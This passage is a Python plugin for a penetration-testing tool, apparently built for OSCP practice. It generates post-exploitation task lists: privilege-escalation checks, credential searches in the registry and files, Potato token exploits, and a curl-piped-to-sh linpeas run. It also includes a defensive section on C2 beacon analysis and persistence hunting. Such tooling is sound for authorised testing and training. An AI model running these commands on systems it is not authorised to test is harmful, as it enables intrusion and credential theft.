"""
Post-exploitation enumeration plugin

Activated when user obtains shell access.
Generates tasks for privilege escalation and system enumeration.
"""

from typing import Dict, Any, List, Optional
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PostExploitPlugin(ServicePlugin):
    """Post-exploitation enumeration plugin"""

    @property
    def name(self) -> str:
        return "post-exploit"

    def detect(self, port_info: Dict[str, Any]) -> bool:
        # This plugin is manually triggered, not auto-detected
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate post-exploit plugin when shell is obtained

        Triggers on:
        - Shell obtained findings
        - Successful RCE exploitation
        - Command execution achieved

        Args:
            finding: Finding dictionary with type, description, source
            profile: Optional target profile for context

        Returns:
            Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - explicit shell types
        if finding_type in [FindingTypes.SHELL_OBTAINED,
                           FindingTypes.LOW_PRIVILEGE_SHELL,
                           FindingTypes.HIGH_PRIVILEGE_SHELL,
                           FindingTypes.ROOT_SHELL,
                           FindingTypes.SYSTEM_SHELL,
                           FindingTypes.ADMIN_SHELL,
                           FindingTypes.ACCESS_GAINED]:
            logger.info(f"Post-exploit plugin activating: {finding_type}")
            return 100

        # High confidence - shell indicators in description
        shell_indicators = [
            'shell obtained', 'got shell', 'shell access',
            'reverse shell', 'bind shell', 'web shell',
            'rce achieved', 'remote code execution',
            'command execution', 'code execution'
        ]
        if any(indicator in description for indicator in shell_indicators):
            logger.info(f"Post-exploit plugin activating: shell indicator in description")
            return 90

        # High confidence - RCE with success indication
        if finding_type == FindingTypes.REMOTE_CODE_EXECUTION:
            if 'success' in description or 'achieved' in description:
                return 85
            return 70

        # Medium confidence - vulnerability exploited
        if finding_type == FindingTypes.VULNERABILITY_FOUND and 'exploited' in description:
            return 70

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate post-exploitation enumeration tasks

        Handles both port-based and finding-based activation.

        service_info may contain:
        - For port activation: os_type from port scan
        - For finding activation: finding with OS details, activation_source='finding'
        """
        # Detect activation source
        if service_info.get('activation_source') == 'finding':
            # Finding-based activation - extract OS from finding
            finding = service_info.get('finding', {})
            os_type = self._detect_os_from_finding(finding)
        else:
            # Port-based activation (original logic)
            os_type = service_info.get('os_type', 'linux').lower()

        if os_type == 'linux':
            return self._get_linux_tasks(target)
        elif os_type == 'windows':
            return self._get_windows_tasks(target)
        else:
            return self._get_generic_tasks(target)

    def _detect_os_from_finding(self, finding: Dict[str, Any]) -> str:
        """Detect OS type from finding context

        Args:
            finding: Finding dictionary

        Returns:
            OS type string: 'linux', 'windows', or 'unknown'
        """
        description = finding.get('description', '').lower()
        finding_type = finding.get('type', '').lower()

        # Windows indicators
        windows_indicators = [
            'windows', 'powershell', 'cmd.exe', 'cmd /c',
            'nt authority', 'system32', 'iis', 'aspx',
            'microsoft', 'windows server', 'administrator'
        ]
        if any(ind in description for ind in windows_indicators):
            return 'windows'

        # Linux indicators
        linux_indicators = [
            'linux', 'bash', '/bin/sh', '/bin/bash',
            'www-data', 'apache', 'nginx', 'nobody', 'tomcat',
            'ubuntu', 'debian', 'centos', 'redhat', 'fedora',
            '/home/', '/var/www', '/etc/passwd'
        ]
        if any(ind in description for ind in linux_indicators):
            return 'linux'

        # Default to linux (most common in OSCP)
        return 'linux'

    def _get_linux_tasks(self, target: str) -> Dict[str, Any]:
        """Linux privilege escalation enumeration"""
        return {
            'id': 'post-exploit-linux',
            'name': 'Linux Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'linux-suid',
                    'name': 'Find SUID Binaries',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -u=s -type f 2>/dev/null',
                        'description': 'Find SUID binaries (potential privesc)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-perm -u=s': 'Find files with SUID bit set',
                            '-type f': 'Only files (not directories)',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'next_steps': [
                            'Check each binary against GTFOBins: https://gtfobins.github.io/',
                            'Look for unusual SUID binaries (not standard system binaries)',
                            'Test custom binaries for command injection'
                        ]
                    }
                },
                {
                    'id': 'linux-sudo',
                    'name': 'Check Sudo Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo -l',
                        'description': 'List allowed sudo commands for current user',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': [
                            'Look for NOPASSWD entries',
                            'Check GTFOBins for sudo escalation',
                            'Common wins: sudo vim, sudo find, sudo nmap --interactive'
                        ]
                    }
                },
                {
                    'id': 'linux-capabilities',
                    'name': 'Check File Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'getcap -r / 2>/dev/null',
                        'description': 'Find binaries with special capabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'cap_setuid+ep allows setting UID to root',
                            'Check python, perl, tar with setuid capability'
                        ]
                    }
                },
                {
                    'id': 'linux-cron',
                    'name': 'Check Cron Jobs',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Look for writable cron jobs or scripts',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': [
                            'cat /etc/crontab',
                            'ls -la /etc/cron.*',
                            'Check user cron: crontab -l',
                            'Look for writable scripts executed by root'
                        ]
                    }
                },
                {
                    'id': 'linux-writable',
                    'name': 'Find World-Writable Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -writable -type f 2>/dev/null | grep -v proc',
                        'description': 'Find writable files (potential config/script modification)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL']
                    }
                },
                {
                    'id': 'linux-kernel',
                    'name': 'Kernel Version Check',
                    'type': 'command',
                    'metadata': {
                        'command': 'uname -a',
                        'description': 'Get kernel version for exploit research',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'notes': 'searchsploit linux kernel <version>'
                    }
                },
                {
                    'id': 'linux-network',
                    'name': 'Network Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate network connections and routes',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'netstat -antup # Active connections',
                            'ip addr # Network interfaces',
                            'ip route # Routing table',
                            'cat /etc/hosts # Known hosts'
                        ]
                    }
                },
                {
                    'id': 'linux-linpeas',
                    'name': 'LinPEAS Automated Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
                        'description': 'Automated Linux privilege escalation enumeration',
                        'tags': ['AUTOMATED', 'OSCP:HIGH'],
                        'notes': 'Review output carefully - highlights potential vectors'
                    }
                }
            ]
        }

    def _get_windows_tasks(self, target: str) -> Dict[str, Any]:
        """Windows privilege escalation enumeration"""
        return {
            'id': 'post-exploit-windows',
            'name': 'Windows Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'win-sysinfo',
                    'name': 'System Information',
                    'type': 'command',
                    'metadata': {
                        'command': 'systeminfo',
                        'description': 'Get system info, hotfixes, and OS version',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': 'Check for missing patches, especially privilege escalation CVEs'
                    }
                },
                {
                    'id': 'win-whoami',
                    'name': 'Current User Privileges',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /all',
                        'description': 'Get current user info, groups, and privileges',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': [
                            'Look for SeImpersonatePrivilege (Potato attacks)',
                            'Check group memberships (Administrators, Backup Operators, etc.)'
                        ]
                    }
                },
                {
                    'id': 'win-unquoted',
                    'name': 'Find Unquoted Service Paths',
                    'type': 'command',
                    'metadata': {
                        'command': 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
                        'description': 'Find services with unquoted paths (potential hijack)',
                        'tags': ['OSCP:HIGH', 'MANUAL']
                    }
                },
                {
                    'id': 'win-services',
                    'name': 'Check Service Permissions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Look for writable service binaries or configs',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': [
                            'accesschk.exe -uwcqv * # Check write access',
                            'icacls "C:\\Program Files\\<service>\\service.exe"',
                            'Look for (F)ull or (M)odify permissions'
                        ]
                    }
                },
                {
                    'id': 'win-autologon',
                    'name': 'Search for Credentials',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find stored credentials',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': [
                            'reg query HKLM /f password /t REG_SZ /s',
                            'reg query HKCU /f password /t REG_SZ /s',
                            'type C:\\unattend.xml',
                            'dir /s *pass* == *cred* == *vnc* == *.config*',
                            'cmdkey /list # Saved credentials'
                        ]
                    }
                },
                {
                    'id': 'win-tokens',
                    'name': 'Token Impersonation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit token impersonation privileges',
                        'tags': ['EXPLOIT', 'OSCP:HIGH'],
                        'notes': [
                            'If SeImpersonatePrivilege enabled: use Potato exploit',
                            'JuicyPotato, RoguePotato, PrintSpoofer',
                            'Metasploit: incognito module'
                        ]
                    }
                },
                {
                    'id': 'win-winpeas',
                    'name': 'WinPEAS Automated Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'winpeas.exe',
                        'description': 'Automated Windows privilege escalation enumeration',
                        'tags': ['AUTOMATED', 'OSCP:HIGH'],
                        'notes': 'Download from: https://github.com/carlospolop/PEASS-ng/releases'
                    }
                }
            ]
        }

    def _get_generic_tasks(self, target: str) -> Dict[str, Any]:
        """Generic post-exploitation tasks"""
        return {
            'id': 'post-exploit-generic',
            'name': 'Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'generic-user-enum',
                    'name': 'User Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify current user and privileges',
                        'tags': ['MANUAL']
                    }
                },
                {
                    'id': 'generic-network',
                    'name': 'Network Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify network connections and interfaces',
                        'tags': ['MANUAL']
                    }
                }
            ]
        }

    def _get_c2_analysis_tasks(self, target: str, os_type: str = 'windows') -> Dict[str, Any]:
        """C2 beacon configuration extraction and analysis tasks"""
        return {
            'id': 'c2-analysis',
            'name': 'C2 Configuration Extraction and Analysis',
            'type': 'parent',
            'children': [
                # Memory Analysis
                {
                    'id': 'c2-memory-dump',
                    'name': 'Process Memory Dump',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'c2-identify-suspicious',
                            'name': 'Identify Suspicious Processes',
                            'type': 'command',
                            'metadata': {
                                'command': 'ps aux | grep -E "powershell|rundll32|regsvr32|mshta|wscript|cscript" | grep -v grep' if os_type == 'linux' else 'tasklist /v | findstr /i "powershell rundll32 regsvr32 mshta wscript cscript"',
                                'description': 'Identify processes commonly used for C2 beacons',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'grep -E': 'Extended regex for pattern matching',
                                    'grep -v grep': 'Exclude grep process itself from results',
                                    '/v': 'Verbose output (shows window title, user)',
                                    'findstr /i': 'Case-insensitive string search'
                                },
                                'success_indicators': [
                                    'PowerShell processes with suspicious command lines',
                                    'rundll32.exe without legitimate DLL paths',
                                    'Processes running from temp directories'
                                ],
                                'failure_indicators': [
                                    'No suspicious processes found',
                                    'Permission denied (need elevated privileges)'
                                ],
                                'next_steps': [
                                    'Dump suspicious process memory',
                                    'Extract command line arguments',
                                    'Check process parent-child relationships'
                                ],
                                'alternatives': [
                                    'Windows: Get-Process | Where-Object {$_.ProcessName -match "powershell|rundll32"}',
                                    'Manual: Open Task Manager -> Details tab',
                                    'Linux: top/htop and look for unusual processes'
                                ],
                                'notes': 'C2 beacons often use LOLBAS binaries for execution',
                                'estimated_time': '2-3 minutes'
                            }
                        },
                        {
                            'id': 'c2-dump-process',
                            'name': 'Dump Suspicious Process Memory',
                            'type': 'command',
                            'metadata': {
                                'command': 'procdump -ma <PID> beacon_dump.dmp' if os_type == 'windows' else 'gcore -o beacon_dump <PID>',
                                'description': 'Create full memory dump of suspicious process for analysis',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    '-ma': 'Create full memory dump with all accessible memory',
                                    'procdump': 'Sysinternals tool for process memory dumping',
                                    'gcore': 'GNU core dump utility',
                                    '-o': 'Output file prefix'
                                },
                                'success_indicators': [
                                    'Dump file created successfully',
                                    'File size indicates full process memory'
                                ],
                                'failure_indicators': [
                                    'Access denied (need admin/root)',
                                    'Process terminated before dump completed'
                                ],
                                'next_steps': [
                                    'Extract strings from dump file',
                                    'Search for C2 configuration indicators',
                                    'Look for encryption keys, domains, IPs'
                                ],
                                'alternatives': [
                                    'Windows: Out-Minidump (PowerShell)',
                                    'Linux: cat /proc/<PID>/maps; dd to extract regions',
                                    'Manual: Use Process Hacker to save memory regions'
                                ],
                                'notes': 'Download procdump: https://live.sysinternals.com/procdump.exe',
                                'estimated_time': '5-10 minutes'
                            }
                        }
                    ]
                },
                # Beacon Configuration Extraction
                {
                    'id': 'c2-config-extraction',
                    'name': 'Beacon Configuration Extraction',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'c2-find-beacon-files',
                            'name': 'Locate Beacon Binaries',
                            'type': 'command',
                            'metadata': {
                                'command': 'find /tmp /var/tmp /dev/shm $HOME -type f -executable 2>/dev/null' if os_type == 'linux' else 'dir /s /b C:\\Users\\*\\AppData\\*.exe C:\\Users\\*\\AppData\\*.dll C:\\Temp\\*.exe 2>nul',
                                'description': 'Find potential beacon binaries in common staging locations',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    '-type f': 'Search for files only (not directories)',
                                    '-executable': 'Find files with execute permissions',
                                    '2>/dev/null': 'Suppress permission denied errors',
                                    '/s': 'Search subdirectories recursively',
                                    '/b': 'Bare format (paths only, no headers)'
                                },
                                'success_indicators': [
                                    'Executables found in temp/user directories',
                                    'DLLs with unusual names or locations',
                                    'Files with recent modification times'
                                ],
                                'failure_indicators': [
                                    'No files found (beacon may be in memory only)',
                                    'Permission denied on all paths'
                                ],
                                'next_steps': [
                                    'Extract strings from suspicious binaries',
                                    'Check PE headers for packed/encrypted sections',
                                    'Look for embedded configuration data'
                                ],
                                'alternatives': [
                                    'Windows: Get-ChildItem -Recurse -File | Where-Object {$_.Extension -match "exe|dll"}',
                                    'Linux: lsof | grep deleted (in-memory execution)',
                                    'Manual: Check temp folders in File Explorer'
                                ],
                                'notes': 'C2 beacons often stage in %TEMP%, %APPDATA%, /tmp, /dev/shm',
                                'estimated_time': '3-5 minutes'
                            }
                        },
                        {
                            'id': 'c2-strings-analysis',
                            'name': 'Extract Strings from Beacon',
                            'type': 'command',
                            'metadata': {
                                'command': 'strings -a -n 8 beacon.exe | grep -E "(http|https|tcp|smb|pipe|Mozilla|User-Agent|X-|POST|GET)" | tee beacon_strings.txt',
                                'description': 'Extract printable strings looking for C2 indicators',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'strings': 'Extract printable character sequences from binary',
                                    '-a': 'Scan entire file (not just data sections)',
                                    '-n 8': 'Minimum string length of 8 characters',
                                    'grep -E': 'Extended regex for multiple patterns',
                                    'tee': 'Save output to file while displaying'
                                },
                                'success_indicators': [
                                    'HTTP/HTTPS URLs or domains found',
                                    'User-Agent strings (e.g., "Mozilla/5.0")',
                                    'Custom headers (X-Beacon-Id, X-App-Id)',
                                    'Named pipes for SMB C2',
                                    'Sleep/jitter timing values'
                                ],
                                'failure_indicators': [
                                    'No URLs/domains found (config may be encrypted)',
                                    'Only gibberish strings (heavily obfuscated)',
                                    'Binary is packed/encrypted'
                                ],
                                'next_steps': [
                                    'Research extracted domains/IPs',
                                    'Identify C2 framework by User-Agent patterns',
                                    'Check for encryption keys or RC4 patterns',
                                    'Extract configuration blob for decryption'
                                ],
                                'alternatives': [
                                    'Windows: strings.exe from Sysinternals',
                                    'Manual: Open in hex editor (HxD, 010 Editor)',
                                    'objdump -s -j .rdata beacon.exe (PE .rdata section)',
                                    'xxd beacon.exe | grep -E "http|Mozilla"'
                                ],
                                'notes': 'AdaptixC2 stores config in .rdata as [size|RC4_ciphertext|16-byte key]',
                                'estimated_time': '5 minutes'
                            }
                        },
                        {
                            'id': 'c2-rc4-decrypt',
                            'name': 'Decrypt RC4 Configuration (AdaptixC2)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Extract and decrypt RC4-packed C2 configuration',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT', 'RESEARCH'],
                                'notes': [
                                    'AdaptixC2 config format: [4 bytes size][N bytes RC4 ciphertext][16 bytes key]',
                                    'Locate blob in PE .rdata section (often at end of section)',
                                    'Python RC4 decryption script:',
                                    '',
                                    'import struct',
                                    'def rc4(key, data):',
                                    '    S = list(range(256))',
                                    '    j = 0',
                                    '    for i in range(256):',
                                    '        j = (j + S[i] + key[i % len(key)]) & 0xFF',
                                    '        S[i], S[j] = S[j], S[i]',
                                    '    i = j = 0',
                                    '    out = bytearray()',
                                    '    for b in data:',
                                    '        i = (i + 1) & 0xFF',
                                    '        j = (j + S[i]) & 0xFF',
                                    '        S[i], S[j] = S[j], S[i]',
                                    '        out.append(b ^ S[(S[i] + S[j]) & 0xFF])',
                                    '    return bytes(out)',
                                    '',
                                    'blob = open("beacon.bin","rb").read()',
                                    'size = struct.unpack("<I", blob[:4])[0]',
                                    'ct = blob[4:4+size]',
                                    'key = blob[4+size:4+size+16]',
                                    'config = rc4(key, ct)',
                                    'print(config)',
                                    '',
                                    'Parse config: u32 agent_type, bool use_ssl, u32 server_count, [strings], etc.',
                                    'Reference: https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/'
                                ],
                                'alternatives': [
                                    'Use CyberChef with RC4 recipe',
                                    'radare2/Ghidra to locate decryption routine',
                                    'Dynamic analysis: Set breakpoint on RC4 function'
                                ],
                                'estimated_time': '15-30 minutes'
                            }
                        }
                    ]
                },
                # Network Indicators
                {
                    'id': 'c2-network-indicators',
                    'name': 'C2 Network Indicators',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'c2-active-connections',
                            'name': 'Identify Active C2 Connections',
                            'type': 'command',
                            'metadata': {
                                'command': 'netstat -antp 2>/dev/null | grep ESTABLISHED' if os_type == 'linux' else 'netstat -ano | findstr ESTABLISHED',
                                'description': 'List active network connections to identify C2 callbacks',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    '-a': 'Show all connections and listening ports',
                                    '-n': 'Show numerical addresses (no DNS resolution)',
                                    '-t': 'Show TCP connections only',
                                    '-p': 'Show process ID/name for each connection',
                                    '-o': 'Show owning process ID (Windows)'
                                },
                                'success_indicators': [
                                    'Connections to external IPs on common C2 ports (443, 80, 8443, 4443)',
                                    'Suspicious processes with outbound connections',
                                    'Connections to known malicious IPs/domains',
                                    'Named pipe connections (SMB C2)'
                                ],
                                'failure_indicators': [
                                    'No suspicious connections (beacon may be sleeping)',
                                    'Permission denied (need root/admin)',
                                    'DNS resolution shows legitimate services'
                                ],
                                'next_steps': [
                                    'Research destination IPs with threat intel',
                                    'Correlate with process list (match PIDs)',
                                    'Capture traffic with tcpdump/Wireshark',
                                    'Extract User-Agent from HTTP traffic'
                                ],
                                'alternatives': [
                                    'Windows: Get-NetTCPConnection | Where-Object State -eq "Established"',
                                    'Linux: ss -antp | grep ESTAB',
                                    'Manual: TCPView (Sysinternals) shows live connections',
                                    'lsof -i -n (shows process details)'
                                ],
                                'notes': 'Common C2 ports: 443 (HTTPS), 80 (HTTP), 53 (DNS), 8080, 8443, 4443',
                                'estimated_time': '2-3 minutes'
                            }
                        },
                        {
                            'id': 'c2-traffic-capture',
                            'name': 'Capture C2 Traffic',
                            'type': 'command',
                            'metadata': {
                                'command': 'tcpdump -i any -w c2_traffic.pcap host <C2_IP> or port 443 or port 80',
                                'description': 'Capture network traffic to/from suspected C2 server',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'tcpdump': 'Packet capture utility',
                                    '-i any': 'Capture on all interfaces',
                                    '-w': 'Write packets to file (PCAP format)',
                                    'host': 'Filter traffic to/from specific IP',
                                    'port': 'Filter traffic on specific port'
                                },
                                'success_indicators': [
                                    'PCAP file created with traffic data',
                                    'HTTP POST requests to C2 URIs visible',
                                    'Custom headers (X-Beacon-Id, X-App-Id) in traffic',
                                    'SSL/TLS connections to suspicious domains'
                                ],
                                'failure_indicators': [
                                    'No packets captured (wrong interface or filter)',
                                    'Permission denied (need root)',
                                    'Encrypted traffic (need SSL interception)'
                                ],
                                'next_steps': [
                                    'Analyze PCAP in Wireshark',
                                    'Extract HTTP headers and parameters',
                                    'Look for beaconing patterns (regular intervals)',
                                    'Extract User-Agent strings for framework identification'
                                ],
                                'alternatives': [
                                    'Windows: Wireshark GUI capture',
                                    'tshark -i <interface> -w c2.pcap',
                                    'Netsh trace (built-in Windows packet capture)',
                                    'Manual: Enable firewall logging to track connections'
                                ],
                                'notes': 'Beacon sleep/jitter creates observable timing patterns in traffic',
                                'estimated_time': '10-15 minutes (capture duration)'
                            }
                        },
                        {
                            'id': 'c2-http-fingerprint',
                            'name': 'HTTP C2 Fingerprinting',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Identify C2 framework by HTTP traffic characteristics',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT', 'RESEARCH'],
                                'notes': [
                                    'Common HTTP C2 indicators:',
                                    '- POST to specific URIs (e.g., /uri.php, /endpoint/api, /load)',
                                    '- Custom headers (X-Beacon-Id, X-App-Id, X-Session-Id)',
                                    '- User-Agent patterns:',
                                    '  * AdaptixC2: "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"',
                                    '  * Cobalt Strike: "Microsoft Internet Explorer" (older), modern Chrome UAs',
                                    '  * Metasploit: Often legitimate-looking UAs',
                                    '- Regular beaconing intervals (sleep + jitter)',
                                    '- Base64/hex encoded payloads in POST data',
                                    '- Response sizes matching ans_pre_size + ans_size fields',
                                    '',
                                    'Wireshark filters:',
                                    '- http.request.method == "POST"',
                                    '- http.user_agent contains "Mozilla"',
                                    '- http.request.uri contains "/uri" or "/endpoint"',
                                    '- http.header contains "X-Beacon" or "X-App"',
                                    '',
                                    'Check extracted config for:',
                                    '- C2 domains/IPs (servers field)',
                                    '- Ports (443, 8443, 4443 common for HTTPS)',
                                    '- URI paths and HTTP methods',
                                    '- Sleep delay and jitter values'
                                ],
                                'alternatives': [
                                    'tshark -r c2.pcap -Y "http.request" -T fields -e http.user_agent',
                                    'Bro/Zeek IDS for automated HTTP analysis',
                                    'Manual: curl -v to C2 URL and observe response'
                                ],
                                'estimated_time': '10-20 minutes'
                            }
                        }
                    ]
                },
                # Persistence Analysis
                {
                    'id': 'c2-persistence-hunt',
                    'name': 'C2 Persistence Mechanism Hunting',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'c2-startup-folders',
                            'name': 'Check Startup Folders',
                            'type': 'command',
                            'metadata': {
                                'command': 'ls -la ~/.config/autostart/ /etc/xdg/autostart/ 2>/dev/null' if os_type == 'linux' else 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" & dir "%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                                'description': 'Find C2 loader shortcuts in startup locations',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'ls -la': 'List all files including hidden with details',
                                    'dir': 'List directory contents (Windows)',
                                    '%APPDATA%': 'User-specific application data folder',
                                    '%PROGRAMDATA%': 'System-wide application data folder'
                                },
                                'success_indicators': [
                                    '.lnk files with suspicious names (Updater, Loader)',
                                    'Shortcuts pointing to PowerShell/rundll32',
                                    'Files with recent creation dates',
                                    '.desktop files with exec= pointing to loaders'
                                ],
                                'failure_indicators': [
                                    'Only legitimate application shortcuts',
                                    'Permission denied (check both user and system locations)'
                                ],
                                'next_steps': [
                                    'Examine shortcut target paths',
                                    'Check for PowerShell loaders or encoded commands',
                                    'Document creation timestamps',
                                    'Remove malicious shortcuts'
                                ],
                                'alternatives': [
                                    'Windows: Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                                    'Manual: Win+R -> shell:startup',
                                    'Check Task Scheduler for scheduled C2 execution'
                                ],
                                'notes': 'Startup folder persistence is MITRE ATT&CK T1547.001',
                                'estimated_time': '3-5 minutes'
                            }
                        },
                        {
                            'id': 'c2-registry-run',
                            'name': 'Check Registry Run Keys',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run & reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                'description': 'Find C2 loaders in registry autorun locations',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT', 'WINDOWS'],
                                'flag_explanations': {
                                    'reg query': 'Query Windows registry keys',
                                    'HKCU': 'HKEY_CURRENT_USER (user-specific settings)',
                                    'HKLM': 'HKEY_LOCAL_MACHINE (system-wide settings)',
                                    '\\CurrentVersion\\Run': 'Autorun key for startup programs'
                                },
                                'success_indicators': [
                                    'Entries with suspicious names (Updater, Loader, update.ps1)',
                                    'PowerShell commands with -enc (encoded)',
                                    'Paths to temp directories or %APPDATA%',
                                    'rundll32 with unusual DLL paths'
                                ],
                                'failure_indicators': [
                                    'Only legitimate software entries',
                                    'Access denied (need admin for HKLM)',
                                    'No suspicious command line patterns'
                                ],
                                'next_steps': [
                                    'Decode PowerShell -EncodedCommand values',
                                    'Research suspicious registry entry names',
                                    'Delete malicious Run keys',
                                    'Check RunOnce, RunServices keys too'
                                ],
                                'alternatives': [
                                    'PowerShell: Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                    'Autoruns (Sysinternals) - GUI view of all autorun locations',
                                    'Manual: regedit and navigate to Run keys',
                                    'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
                                ],
                                'notes': 'Registry Run keys are MITRE ATT&CK T1547.001',
                                'estimated_time': '3-5 minutes'
                            }
                        },
                        {
                            'id': 'c2-dll-hijack',
                            'name': 'Check for DLL Hijacking',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Find malicious DLLs in user-writable search paths',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT', 'WINDOWS'],
                                'notes': [
                                    'Common DLL hijack locations:',
                                    '- %APPDATA%\\Microsoft\\Windows\\Templates\\msimg32.dll',
                                    '- %TEMP% directory with system DLL names',
                                    '- Application directories with writable permissions',
                                    '',
                                    'Check for suspicious DLLs:',
                                    'dir /s /b C:\\Users\\*\\AppData\\*.dll',
                                    'dir /s /b C:\\Users\\*\\AppData\\Local\\Temp\\*.dll',
                                    '',
                                    'Verify DLL is malicious:',
                                    'sigcheck -u -e <dll_path>  (check unsigned)',
                                    'strings <dll_path> | findstr /i "http https"',
                                    '',
                                    'Common hijacked DLLs:',
                                    '- msimg32.dll, version.dll, dwmapi.dll, uxtheme.dll',
                                    '- Often placed in Templates folder for persistence',
                                    '',
                                    'Reference: https://attack.mitre.org/techniques/T1574/001/'
                                ],
                                'alternatives': [
                                    'Process Monitor (Sysinternals) - filter for NAME NOT FOUND DLL loads',
                                    'PowerShell: Get-ChildItem -Recurse -Filter *.dll | Where-Object {$_.DirectoryName -match "AppData"}',
                                    'Manual: Search for DLLs in user profile with File Explorer'
                                ],
                                'estimated_time': '10-15 minutes'
                            }
                        },
                        {
                            'id': 'c2-scheduled-tasks',
                            'name': 'Check Scheduled Tasks',
                            'type': 'command',
                            'metadata': {
                                'command': 'schtasks /query /fo LIST /v | findstr /i "powershell rundll32 wscript"' if os_type == 'windows' else 'crontab -l; ls -la /etc/cron.* /var/spool/cron/crontabs/',
                                'description': 'Find scheduled tasks executing C2 loaders',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'schtasks': 'Windows Task Scheduler command',
                                    '/query': 'Query existing scheduled tasks',
                                    '/fo LIST': 'Format output as list',
                                    '/v': 'Verbose output (show task details)',
                                    'crontab -l': 'List user cron jobs',
                                    'ls -la /etc/cron.*': 'List system cron jobs'
                                },
                                'success_indicators': [
                                    'Tasks with PowerShell/scripting interpreters',
                                    'Tasks running from temp/AppData directories',
                                    'Tasks with suspicious names',
                                    'Tasks running at user login or regular intervals'
                                ],
                                'failure_indicators': [
                                    'Only system/legitimate tasks found',
                                    'Access denied (need admin)',
                                    'No tasks with scripting interpreters'
                                ],
                                'next_steps': [
                                    'Export suspicious task XML for analysis',
                                    'Check task trigger conditions',
                                    'Delete malicious scheduled tasks',
                                    'Review task action command lines'
                                ],
                                'alternatives': [
                                    'Windows: Get-ScheduledTask | Where-Object {$_.Actions -match "powershell"}',
                                    'Task Scheduler GUI (taskschd.msc)',
                                    'Linux: grep -r "loader\\|beacon\\|powershell" /etc/cron.* /var/spool/cron/',
